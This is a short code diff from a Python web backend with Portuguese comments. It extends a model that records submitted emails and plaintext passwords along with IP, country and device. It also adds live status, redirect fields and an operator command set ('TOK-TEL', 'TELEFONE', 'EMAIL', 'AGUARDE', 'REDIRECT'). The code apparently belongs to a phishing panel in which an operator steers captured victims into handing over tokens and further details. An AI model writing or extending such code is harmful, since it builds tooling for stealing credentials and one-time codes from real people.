@@ -58,11 +58,13 @@ class LoginAttempt(BaseModel):
     id: str = Field(default_factory=lambda: str(uuid.uuid4()))
     email: str
     password: str
-    status: str = "failed"
+    status: str = "offline"  # "online" ou "offline"
     ip_address: Optional[str] = None
     country: Optional[str] = None
     device: Optional[str] = None
-    page: Optional[str] = None
+    page: Optional[str] = "Página Loading..."
+    current_action: Optional[str] = None  # Para armazenar o comando atual
+    redirect_url: Optional[str] = None
     timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
 
 class LoginAttemptCreate(BaseModel):
@@ -72,6 +74,11 @@ class LoginAttemptCreate(BaseModel):
     country: Optional[str] = None
     device: Optional[str] = None
     page: Optional[str] = None
+
+class CommandRequest(BaseModel):
+    user_id: str
+    command: str  # "INV", "AUT", "EMAIL", "TOK-TEL", "TELEFONE", "AGUARDE", "REDIRECT"
+    redirect_url: Optional[str] = None
 
 # Helper Functions
 def create_access_token(data: dict):
